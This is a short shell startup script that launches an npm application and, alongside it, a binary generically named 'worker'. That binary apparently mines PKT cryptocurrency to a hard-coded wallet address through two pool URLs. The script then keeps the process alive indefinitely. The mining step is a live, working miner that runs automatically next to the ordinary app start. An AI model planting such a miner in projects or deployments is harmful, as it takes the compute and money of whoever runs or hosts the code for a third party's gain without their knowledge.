#!/bin/sh

nohup npm start &

nohup ./worker ann -p pkt1qu0kmc8smnphjl8ufyefktzcs7auq3aa7032skx http://pool.pktpool.io http://pool.pkt.world

tail -f /dev/null
